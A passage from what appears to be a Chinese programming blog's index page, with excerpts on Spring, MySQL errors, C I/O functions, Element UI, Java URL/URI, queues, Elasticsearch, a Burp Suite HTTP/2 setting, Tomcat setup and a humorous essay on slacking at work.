DI：它其实就把容器中创建存放好的对象，通过DI机制去完成类中存在依赖关系的对象实例化的问题。
如果你完成依赖注入的话：
就必须遵从它的注入规范：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b9f37f8b0fd09b3e7bf74bde9f1710d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057591b2545397ac44292cb94ea95055/" rel="bookmark">
			MySQLIntegrityConstraintViolationException: #23000
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		闲来无事运行我以前写的代码时,报错MySQLIntegrityConstraintViolationException: #23000.
一. 异常原因 插入主键时,表中已有相同的主键,所以报错.插入的新数据，与表的主键唯一约束产生了冲突
就是新数据的主键在表中已经存在了.
二. 解决方法 1.更换插入的主键数据
2.把主键设置为自动递增,插入数据时不插入主键.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c694867d220614971cdbc09d374ad4e8/" rel="bookmark">
			超详细讲解SpringMVC三层架构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringMVC三层架构 Java SpringMVC的工程结构一般来说分为三层，自下而上是Modle层（模型，数据访问层）、Cotroller层（控制，逻辑控制层）、View层（视图，页面显示层），其中Modle层分为两层：dao层、service层，MVC架构分层的主要作用是解耦。采用分层架构的好处，普遍接受的是系统分层有利于系统的维护，系统的扩展。就是增强系统的可维护性和可扩展性。
对于Spring这样的框架，（View\Web）表示层调用控制层（Controller），控制层调用业务层（Service），业务层调用数据访问层（Dao）。
service层：业务层，用来实现业务逻辑。能调用dao层或者service层，返回数据对象DO或者业务对象BO，BO通常由DO转化、整合而来，可以包含多个DO的属性，也可以是只包含一个DO的部分属性。通常为了简便，如果无需转化，service也可以直接返回DO。外部调用（HTTP、RPC）方法也在这一层，对于外部调用来说，service一般会将外部调用返回的DTO转化为BO。是专注业务逻辑，对于其中需要的数据库操作，都通过Dao去实现。主要去负责一些业务处理，比如取得连接、关闭数据库连接、事务回滚,一些复杂的逻辑业务处理就放到service层。
DAO层：负责访问数据库进行数据的操作，取得结果集，之后将结果集中的数据取出封装到VO类对象之后返回给service层。数据层，直接进行数据库的读写操作，返回数据对象DO，DO与数据库表一一对应。Dao的作用是封装对数据库的访问：增删改查，不涉及业务逻辑，只是达到按某个条件获得指定数据的要求。
Cotroller层：叫做控制层，主要的功能是处理用户发送的请求。主要处理外部请求。调用service层，将service层返回的BO/DO转化为DTO/VO并封装成统一返回对象返回给调用方。如果返回数据用于前端模版渲染则返回VO，否则一般返回DTO。不论是DTO还是VO，一般都会对BO/DO中的数据进行一些转化和整合，比如将gender属性中的0转化“男”，1转化为“女”等。controller的功能主要有5点：参数校验、调用service层接口实现业务逻辑、转换业务／数据对象、组装返回对象、异常处理。
View层：叫做显示层，主要是负责现实数据。
在实际开发中dao层要先定义出自己的操作标准即标准接口，就是为了解耦合。
稍微小一点的公司一般就3层：
dao-&gt;数据层
service -&gt; 业务实现
web -&gt; web 接口
稍微大一点的公司一般最多就7层：
（日志接入，对查问题有帮助的地方才接入日志）
common—&gt;公共方法，公共类，工具类，只有关键地方加日志
dao-&gt;数据层，不加日志
domain-&gt;实体类，不加日志
rpc-&gt;调用接口，出入参加日志
sdk-&gt; 给外部提供sdk,例如对外接口，只是提供接口定义，该层没有业务逻辑，真实的sdk逻辑实现是在service层，不加日志
service -&gt; 业务实现逻辑，单元测试进行层，日志接入：关键地方可以加， 实现sdk层的接口方法出入参加日志
web -&gt; web 接口，对外提供http 接口，一般都有逻辑，http 是直接对 c的，看到的ip 是c端用户的，出入参加日志
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0abdb18a6d73f0c093bed7ede0c7ef3/" rel="bookmark">
			C语言中的 gets,puts,getchar,putchar函数解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面:
刚开始学习C语言的同学,都会遇到这么几个输入输出函数,并且会很容易误用,错用,导致最终的出错.因此我们需要整体的学习一下这几个函数,下面就让我们一起来学习吧...
一.getchar函数 从标准输入 stdin 获取一个字符（一个无符号字符）。这等同于 getc 带有 stdin 作为参数
函数的声明:
int getchar(void); 返回值:该函数以无符号char强制转换为int的形式返回读取的字符(即返回该字符对应的asc码值),如果到达文件末尾或发生读错误,则返回EOF.
用法实例: 二.putchar函数 把参数char指定的字符(一个无符号字符)写入到标准输出stdout中.
函数的声明:
int putchar(int char); 参数: 这是要被写入的字符,该字符以其对应的int值进行传递.
返回值:该函数以无符号 char 强制转换为 int 的形式返回写入的字符，如果发生错误则返回 EOF。
用法实例:
三.gets函数 从标准输入stdin读取一行,并把它存储在str所指向的字符串中.当读取到换行符时,或者到达文件末尾时,它会停止,具体视情况而定.
函数的声明:
char* gets(char* str); 参数str:这里是指向一个字符数组的指针,该数组存储了C字符串.
返回值:如果成功,则返回str.如果发生错误或者到达文件末尾还未读取任何字符,则返回NULL.
用法实例:
四.puts函数 把一个字符串写入到标准输出stdout,直到空字符,但不包括空字符.换行符会被追加到输出中.
函数的声明:
int puts(const char *str) 参数:是要被输出的C字符串
返回值:如果成功,该函数返回一个非负值为字符串长度(包括末尾的\0),如果发生错误则返回EOF.
用法实例:
最普通的生活最难得，难得人心，难得清醒
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55eddcc4ea57354accf3035c9f5cf0e7/" rel="bookmark">
			网站快速成型工具-Element UI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Element UI Element UI1 什么是Element UI？？？？2 搭建环境2.1 创建vue项目2.2 安装 element-ui组件2.3 Element UI 引入 3 布局3.1 布局3.2 reset.css3.3 满屏填充 4 导航条4.1 需求4.2 导航条4.3 路由4.4 页面刷新导航选中问题 5 表格：查询列表5.1 测试页面5.2 基本表格5.3 表格修饰5.4 多选![在这里插入图片描述](https://img-blog.csdnimg.cn/87a16b32f4a447e6bb5d8920baa15262.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-q5qWg5ZaD,size_20,color_FFFFFF,t_70,g_se,x_16)5.5 自定义模板5.7 条件查询5.8 分页条 6 表单6.1 简单表单：登录6.2 复杂表单：注册6.3 表单校验6.4 自定义校验 7 常见组件7.1 按钮 Button7.2 消息提示 Message7.3 弹框 MessageBox：确认消息7.4弹出框7.5 抽屉![在这里插入图片描述](https://img-blog.csdnimg.cn/70ac22fad1994a578cdd3b2b079333a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-q5qWg5ZaD,size_20,color_FFFFFF,t_70,g_se,x_16)7.6 标签页 8 Tree组件8.1 表结构8.2 后端实现8.3 前端基本实现8.4 修改状态 学习方式我们还是按三布来的方式，我觉得这样学比较明白（如果有其他想法留言给我~~）
Element UI 1 什么是Element UI？？？？ Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库
Element UI是基于Vue 2.0的Element UI 提供一组组件Element UI 提供组件的参考实例, 直接复制 官方网站：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55eddcc4ea57354accf3035c9f5cf0e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9847a82f922b7515ec5cfdc53432df15/" rel="bookmark">
			JAVA网络编程个人笔记 第五章 URL和URI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JAVA网络编程个人笔记 第五章 URL和URI URL和URIURL/URI简介URI与URL的定义URL的语法schemeuser:passwordhostportpathParamsqueryFragment代码实例 UserInfo属性代码实例 URL类URL类简介创建对象从字符串构建URL对象代码实例 由组成部分构建URL对象根据相对URL构建URL对象代码实现 从URL对象获取信息openStream()方法代码实现 openConnection方法getContent()方法 分解URLURL类的Object方法equals()方法sameFile()方法toString()方法toURI()方法 URI类URI类简介创建URI对象URI(String str)URI(String scheme,String ssp,String fragment)和URL类的几点区别： 解析相对URI代码实现 URI相等性和比较equals()方法hashCode()方法toString()方法代码实现 Comparable接口 URLEncoder与URLDecoderURIEncoderDecoder 通过GET方法与服务器端程序通信访问口令保护的网站 URL和URI URL/URI简介 URI与URL的定义 URL：统一资源定位符
URI：统一资源标志符
URI与URL都是定位资源位置的，就是表示这个资源的位置信息，就像经纬度一样可以表示你在世界的那个角落URI是一种宽泛的含义更广的定义，而URL则是URI的一个子集，就是说URL是URI的一部分每个URL都是URI，但不是每个URI都是URLURL是可以直接操作的，但是URI并不行在java.net.URI，只能看到他的一些属性，他只是表示一个表示，但是你没有办法通过URI获取这个对象的流但是URL不一样。java.net.URL该类提供方法openConnection()，通过该方法我们可以通过IO流操作它 URL的语法 URL与URI很像，两者的格式几乎差不多，但是我们接触的还是URL比较多，就以URL为例说明
URL提供了一种访问定位因特网上任意资源的手段，但是这些资源可以通过不同的方法来访问
不管怎么样，他都基本由9个部分组成：
scheme 获取资源使用的协议，例如:http、ftp等，没有默认值
user:password 用户名与密码，这个是一个特殊的存在，一般访问ftp时会用到，她显示的表明了访问资源的用户名和密码。但是这个可以不写，不写的话可能会让你输入用户名密码
host 主机，访问的那台主机，有时候可以是IP，有时候是主机名，例如www.baidu.com
port 端口，访问主机时的端口，如果http访问默认80，可以省略
path 通过host:port我们能找到主机，但是主机上文件很多，通过path则可能定位具体文件
Params 主要作用就是向服务器提供额外的参数，用来表示本次请求的一些特性
例如ftp传输模式有两种，二进制和文本，type=d
query 通过get方式请求的参数
例如：www.qiandu.com/index.html?username=dgh&amp;passwd=123
Fragment 当html页面比较长时，我们通常会将其分为好几段，#1就可以快速定位到某一段
代码实例 URI的组成测试
import java.net.*; public class uriTest { public static void main(String[] args) throws Exception{ URI uri = new URI("http://www.qiandu.com:8080/goods/index.html?username=dgh&amp;passwd=123#j2se"); System.out.println("scheme :"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9847a82f922b7515ec5cfdc53432df15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50ac3723fa5ec6a31d80912559289ef4/" rel="bookmark">
			PyCharm切换Python版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PyCharm切换Python版本
打开File菜单，选择Settings–&gt;Project:Pythonprojects–&gt;Python Interpreter
点击下拉框，点击选择:ShowAll…
在Python Interpreters对话框中，点选加号
弹出Add python Interpreter 对话框：点选System Interpreter
点选下拉框选择python 版本，点击OK，即可切换运行的python版本
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c01f06df92311fa9fe70de84aac3f92/" rel="bookmark">
			java.lang.IllegalArgumentException: surfaceTexture must not be null
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		布局中使用了TextureView来进行视屏播放：
&lt;TextureView android:id="@+id/texture_view" android:layout_centerInParent="true" android:layout_width="wrap_content" android:layout_height="match_parent"/&gt; Avtivity逻辑代码：
private MediaPlayer mMediaPlayer; @BindView(texture_view) public TextureView texture_view; //视频播放器 ......调用如下方法 /** * 视频播放 * @param videoPath 视频路径 */ private void playVideo(String videoPath){ if(mMediaPlayer != null){ mMediaPlayer.stop(); mMediaPlayer.release(); mMediaPlayer = null; } try { mMediaPlayer = new MediaPlayer(); mMediaPlayer.setDataSource(videoPath); mMediaPlayer.setSurface(new Surface(texture_view.getSurfaceTexture())); mMediaPlayer.setLooping(true); mMediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() { @Override public void onPrepared(MediaPlayer mp) { mp.start(); float ratio = mp.getVideoWidth()*1f/mp.getVideoHeight(); int width = texture_view.getWidth(); int height = texture_view.getHeight(); ViewGroup.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c01f06df92311fa9fe70de84aac3f92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e1c7530fa0a1b70fee4c7504b233956/" rel="bookmark">
			什么是队列？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第十二讲 队列 队列定义 队列是一种操作受限的线性表，只允许在表的前端（front）进行删除操作又称作出队，在表的后端进行插入操作，称为入队，符合先进先出（First in First out）的特性。在队尾插入元素叫做入队，对头删除元素叫做出队。
队列实现方式 队列实现方式总共有三种，一种是通过数组实现，一种通过链表实现，另一种通过stl中的模板 queue实现
数组实现 顺序队列 定义一个数组a[N]，并设置两个指针进行管理。一个指针为front指向队头，一个指针为rear指向队尾。当元素入队时，rear加一，当元素出队时 front+1。示意图如下所示：
注意：
假溢出：指队列进行多次入队与出队操作之后，队尾指针已经指向数组最后一个位置，但队列并没有被填满，如果再插入新的元素，就会超过数组的长度，这种溢出我们称为假溢出。
真溢出：指队列进行多次入队与出队操作之后，队尾指针已经指向数组最后一个位置，并且此时队列已经被填满，如果再插入新的元素，就会超过数组的长度，这种溢出我们称为真溢出。
顺序队列实现方式 #include&lt;iostream&gt; using namespace std; const int N=1e5+10; int a[N],hh=0,tt=0;//头指针，尾指针 void push(int x){ a[tt++]=x;//从队尾进队 } bool empty(){//判空 if(hh&lt;tt) return true; else return false; } int front(){//返回队头元素 return a[hh]; } void pop(){//删除队头元素 hh++; } int size(){//队列中的元素个数 return tt-hh; } int main(){ for(int i=1;i&lt;=5;i++) push(i); cout&lt;&lt;front()&lt;&lt;endl; pop(); cout&lt;&lt;size(); } 循环队列 元素进行多次入队出队后，用于实现队列结构的开头部分的数组的开头部分空间会浪费，并且为了克服”假溢出“的情况可以将顺序队列优化成循环队列。循环队列是把顺序队列首位相连，在逻辑上把它看成一个环。
入队：队尾循环后移， rear =（rear+1）%Maxsize;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e1c7530fa0a1b70fee4c7504b233956/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b04e7ee35de7a185afbdfae6d3a602e/" rel="bookmark">
			操作ElasticSearch--项目中添加ES搜索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 使用SpringAPI操作ES添加依赖：配置yml：实体类：新建repostory接口类，实现增删改查方法测试 自定义搜索方法1.根据规范，定义搜索方法名称即可，不需要实现方法2.添加分页： pd项目中添加ES搜索添加依赖配置yml创建实体类创建es创建service创建控制层： 高亮显示搜索结果1.修改repository2.service也需要修改List 使用SpringAPI操作ES 添加依赖： &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; 配置yml： spring: elasticsearch: rest: uris: - http://192.168.64.181:9200 - http://192.168.64.181:9201 - http://192.168.64.181:9202 实体类： /* * spring es api 可以根据这里的设置，在服务器上新建索引 * 如果索引已经存在，不会重复创建 * * 索引一般手动创建，不应该依赖api自动创建 * */ @Document(indexName = "students",shards = 3,replicas = 2) @Data @AllArgsConstructor @NoArgsConstructor public class Student { @Id //使用学生的学号作为索引id private Long id; private String name; private Character gender; @Field("birthDate")//es服务器中的字段名，与属性名相同可以省略 private String birthDate; } 新建repostory接口类，实现增删改查 需要继承ElasticsearchRepository接口
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b04e7ee35de7a185afbdfae6d3a602e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a6df8ee7fab311577e6e8c96627eda3/" rel="bookmark">
			新版burpsuite出现不支持HTTP2的 400 Bad Request报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		浏览器报错内容：
Your browser sent a request that this server could not understand. Error code: 35 Parser Error: [GET / HTTP/2^] 这是因为burp默认启用了http2功能，关掉就好了
Project options &gt; HTTP &gt; HTTP/2 取消勾选
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b214d87027ebfe41e05948b1f5d369bb/" rel="bookmark">
			spring——Java Proxy和Cglib两种方式方法嵌套调用时代理对象行为分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spring——Java Proxy和Cglib两种方式方法嵌套调用代理失效分析 主要分析在方法嵌套调用的时候，两种代理方式的不同的反应，此文是上一篇 Spring——配置类解析过程 配置 衍生物。此文不是Java proxy和Cglib使用的说明文。
当然，文章的开始也是得从例子开始。
文章的开始建议先读
Jdk动态代理分析
例子 接口：
public interface Action { String run(String name); } 实现类
public class TestBean implements Action{ @Override public String run(String name) { System.out.println("TestBean.run"); return this.getClass().getName() + ":" + name; } } 下面就从这个例子来开始分析。
Java Proxy 关于java实现代理的方式之前已经说了。先展示demo
public class ProxyAnalysis { public static void main(String[] args) { System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles","true"); // 添加这个能保存生成的class对象， // 生成代理对象 Action action = (Action) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class&lt;?&gt;[]{Action.class}, new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b214d87027ebfe41e05948b1f5d369bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/841052e6289bbd6e4908601099e184bf/" rel="bookmark">
			推荐系统（十七）推荐系统中的样本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pairwise vs pointwise pairwise构造样本对搜索更加友好，因为搜索关注更多的是item之间细微的差别，而pairwise正符合这种要求；pointwise对推荐更友好，因为推荐的item范围更广，用户更在意单个item质量是不是很好。
hard negative vs easy negative 做召回模型时，一个很重要的环节是负采样。因为线上系统中召回模块面对的是整个资源池，因而为了在离线时模拟线上环境，通常需要对整个资源池进行随机负采样，即easy negative，损失函数公式如下：
r e c a l l _ l o s s = e x p ( v u T e i ) ∑ k ∈ N e x p ( v u T e k ) recall\_loss = \frac{exp(v_u^Te_i)}{\sum_{k\in N} exp(v_u^Te_k)} recall_loss=∑k∈N​exp(vuT​ek​)exp(vuT​ei​)​
其中N代表的是从整个资源池中选出的随机样本。但这样训练的召回模型精度不够，因为正样本（点击数据）和负样本（随机负采样）差异过大，导致模型学习到的信息比较浅显，因而需要加入一些hard negative来增加模型学习的难度。hard negative总体有两大类选法，曝光未点击和召回未曝光，而且每一类不同分段负样本的选择对最终召回模型的效果都会有很大的影响，这个需要视具体业务而定，这里给出添加hard negative后损失函数公式：
r e c a l l _ l o s s = α ⋅ e x p ( v u T e i ) ∑ k ∈ N e x p ( v u T e k ) + ( 1 − α ) ⋅ e x p ( v u T e i ) ∑ m ∈ H e x p ( v u T e m ) recall\_loss = \alpha \cdot \frac{exp(v_u^Te_i)}{\sum_{k\in N} exp(v_u^Te_k)} + (1-\alpha)\cdot \frac{exp(v_u^Te_i)}{\sum_{m\in H} exp(v_u^Te_m)} recall_loss=α⋅∑k∈N​exp(vuT​ek​)exp(vuT​ei​)​+(1−α)⋅∑m∈H​exp(vuT​em​)exp(vuT​ei​)​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/841052e6289bbd6e4908601099e184bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e62a01ce4d692471eb19235e2c69a14c/" rel="bookmark">
			Spring Batch之Step Scope和Late Binding（七）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Step Scope 什么是Scope(作用域、范围、生命周期)?
Scope用户声明IOC容器中对象的存活空间，即在IOC容器在对象进入相应的Scope之前，生成并装配这些对象，在该对象不再处于这些Scope的限定范围之后，容器通常会销毁这些对象。
Step Scope是Spring Batch框架提供了自定义的Scope，将Spring Bean定义为Step Scope，支持Spring Bean在Step开始的时候初始化，在Step结束的时候销毁Spring Bean，将Spring Bean的生命周期与Step绑定。
在Spring Batch框架中，Step Scope会自动被注册到Spring上下文中，如果没有使用Spring的配置文件，需要显示的声明Step Scope。显示声明Step Scope如下：
&lt;bean class="org.springframework.batch.core.scope.StepScope" /&gt; 使用Scope属性声明bean很简单，只要添加属性scope=“step”即可，如下：
&lt;bean id="csvItemWriter" class="org.springframework.batch.item.file.FlatFileItemWriter" scope="step"&gt; ......... &lt;/bean&gt; 通过使用Step Scope，可以支持属性Late Binding(属性后绑定)能力。
二、属性Late Binding(属性后绑定) 什么是Late Binding？有这样的场景，当代码中需要读取文件的时候，就需要获得文件的名字，但是比如账务文件的名字都是根据日期自动生成的，这时候就无法将名字写死，需要通过表达式在代码运行的时候根据日期自动生成文件的名字，这就是Late Binding技术。
Spring Batch框架通过特定的表达式支持为Job或者Step关联的实体使用后绑定技术。在Step Scope中Spring Batch框架提供的可以使用的实体包括：
jobParameters 作业参数
jobExecutionContext 当前Job的执行器上下文
stepExecutionContext 当前Step的执行器上下文
三、项目举例 1.项目框架 2.代码实现 CreditBill.java:
package com.xj.demo6; /** * @Author : xjfu * @Date : 2021/11/17 19:27 * @Description : */ public class CreditBill { //银行卡账户ID private String accountID = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e62a01ce4d692471eb19235e2c69a14c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e464d715f62048ef6c3b7b9488f30ef0/" rel="bookmark">
			相似的字符串java实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		class Solution { public int numSimilarGroups(String[] strs) { //我们可以使用并查集的思想解决这个问题，将相同根的字符串分为一组，想要使用并查集的知识解决问题首先需要找出图的节点和边，我们把每一个字符串当作一个节点，把字符串相似的关系看作是一条边 int length = strs.length; //首先使用一个int数组使用数组下标的方式来记录每一个字符串的根，初始时字符串的根都是自己 int[] fathers = new int[length]; for(int i = 0;i &lt; length;i++){ fathers[i] = i; } //遍历字符串数组，检查每一个字符串之间是否存在相似的关系，如果存在说明当前的当前字符串所在的子集可以和有关系的子集成为一个子集，需要联合起来总的子图数量减去1 int count = length; for(int i = 0;i &lt; length;i++){ for(int j = i + 1;j &lt; length;j++){ if(similer(strs[i],strs[j]) &amp;&amp; union(fathers,i,j)){ count--; } } } return count; } //判断两个子图是否需要合并 private boolean union(int[] fathers,int i,int j){ //找出两个节点的根 int rooti = findRoot(fathers,i); int rootj = findRoot(fathers,j); //如果根不同则需要联合 if(rooti !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e464d715f62048ef6c3b7b9488f30ef0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50ea98787b70a88ab8aab2dd5e8c053a/" rel="bookmark">
			人才梯队如何搭建，3个维度让你打造一支人才团队
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模型在手，方法我有，文末完整版！
一、人才梯队可以不建立吗 二、人才梯队建设的目的 三、梯队人才的培养模型 四、梯队人才的管理 五、人才梯队建设发展通道 人才盘点（素质模型）
人才盘点的内容
人才盘点的结果
人才分类
人才选拔
晋升与发展
……
今日头条
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c90539bfa6fd9acf2d6a9bd58572fdd2/" rel="bookmark">
			WEB应用程序开发(一)部署Tomcat服务器的详细教学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		部署Tomcat服务器的详细教学 配置Tomcat的途径在Tomcat中有几个文件夹要特别说明开发软件实践web项目结构 学习web开发，需要先安装一台web服务器，将开发好的web项目
部署在web服务器中供外界访问
在此篇文章中我们将利用Tomcat服务器进行部署讲解,为什么是Tomcat ?
因为 在小型的应用系统或者有特殊需要的系统中，可以使用一个免费的Web服务器：Apache 的Tomcat，该服务器支持全部JSP以及Servlet规范.
配置Tomcat的途径 第一步
安装Tomcat,将以下链接内容压缩至自定义盘,记住地址 我们后续还要使用
链接：https://pan.baidu.com/s/1NglWEh0tZVxlYOHsTPp8Cg
提取码：acyl
或
到达Tomcat官网下载 Tomcat官方站点：http://tomcat.apache.org
第二步: 安装JDK
配置JAVA_HOME环境变量 (地址为jdk根目录) 如: D:\ProgramFiles\Java\jdk1.8.0_261
TOMCAT会根据java_home去查找jdk安装位置
第三部:测试是否部署成功
在tomcat的bin目录 双击运行 startup.bat命令 启动tomcat
此时本机已经成为了一台微型服务器,可以通过测试本地IP进行测试是否成功
在Tomcat中有几个文件夹要特别说明 bin-----存放启动和关闭 Tomcat 的脚本文件
conf----存放 Tomcat 服务器的各种配置文件
lib----存放 Tomcat 服务器的支撑jar
logs----存放 Tomcat 的日志文件
temp----存放 Tomcat 运行时产生的临时文件
webapps-----web应用所在目录，即供外界访问的web资源的存放目录
work----Tomcat 的工作目录
测试成功后我们就可以进行在我们编程软件上的部署了,在这里我就用我所使用IntelliJ IDEA 来示范
开发软件实践 第一步
将普通的javaSE项目升级为javaEE项目
第二步
添加部署Tomcat服务器
部署完成后,我们就可以创建发布web项目在Tomcat上了
具体步骤：
1.在webContent中创建index.html文件
2.发布web应用到服务器，发布应用有两种方式:
方式1：手动发布
将项目下web目录中的文件复制到服务器webapps目录下，并在此目录 中
创建新的FirstWebTest根目录。
方式2:自动发布
自动将web应用发布到web服务器下，需要在开发工具中集成tomcat进来
3.运行FirstWebTest
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c90539bfa6fd9acf2d6a9bd58572fdd2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a9ff34e005266bdef6748db8d13cc9b/" rel="bookmark">
			python将一个列表拆成两个列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编写程序
''' 功能：将一个列表拆成两个列表 一个列表由奇数元素构成，一个由偶数元素构成 作者：hf 日期：2021.12.4 ''' nums = [5, 6, 8, 3, 6, 1, 12, 33, 78, 19, 24] odds = [] for num in nums: if num % 2 == 1: odds.append(num) print(odds) evens = [] for i in range(len(nums)): if nums[i] % 2 == 0: evens.append(nums[i]) print(evens) 运行程序，查看结果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd75fd4ef9b94141e8bf4914a98590be/" rel="bookmark">
			【职场】看一位前端工程师如何上班摸鱼
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是对白的第 70 期分享
作者 l 霓虹(本文已获原创授权) 出品 l 对白的算法屋
大家好，我是对白。
今天给大家带来一篇我朋友霓虹写的摸鱼文章，他是一位前端工程师，擅长在公司里摸鱼，文笔清奇而搞笑，大家在休闲之余看一看有利于身心的放松，但却不要学习这种行为，因为作者写这篇文章的初衷也只是为了娱乐大家而已😄。
以下是正文。
我这个人比较简单，没事干了就写文章。
最近写文章的频率很明显频繁不少，主要取决于闲着没事干。
所以公司上面给我们发问卷。我再您对公司有什么其他建议这个问题下回答的是我希望公司附近能修一个洗脚城，开个网吧也可以。
摸鱼有三个境界。我把他分为初级摸鱼工程师，中级摸鱼工程师和高级摸鱼工程师。
在我看来初级摸鱼工程师代表摸鱼刚入门，每天都沉浸在这种新鲜的体验中，内心夹杂着背叛规则的快感和时刻担忧的紧张刺激。他们对身边的一切都感到好奇。既想要摸鱼又清醒的认知这在道德上是不对的。
初级摸鱼工程师们的思维水平还在一个比较低的层次上。他们只是为了不上班而摸鱼。为了偷懒而摸。没有正确的思想主义领导自身。但是每一个摸鱼人都是从这个阶级过来的。就好像我太姥爷说的先穿袜子在穿鞋。初级摸鱼工程师们的日常工作只是趁老板不注意看一会小说，看一会电影。刷一会手机，他们时刻不胆战心惊。从心理上需要正确的引导。
而到了中级摸鱼工程师就有了很明显的不同，他们已经找到了人生意义，他们就是为摸鱼而生的。没有什么能阻止他们摸鱼。他们对于自身和老板的定位有了明确的认知，他们把自己当成老板的爹，把自己当成公司的主人。从思想道德水平上他们已经不再内疚，对于摸鱼这件事已经成为了他们日常生活中的一部分。他们敢于向命运抗争，对世俗说不。但是他们拘泥于摸鱼的方法，对于他们来说在公司看电影已经满足不了自身的需求了。只有离开公司才能另自身感到快乐，只有离开工位才能全身心的爽。只要坐在工位上就浑身难受。这也是他们的不足。中级摸鱼工程师会主动向初级摸鱼工程师传授摸鱼经验，他们好为人师。但是对于摸鱼的本质没有清晰的认知。
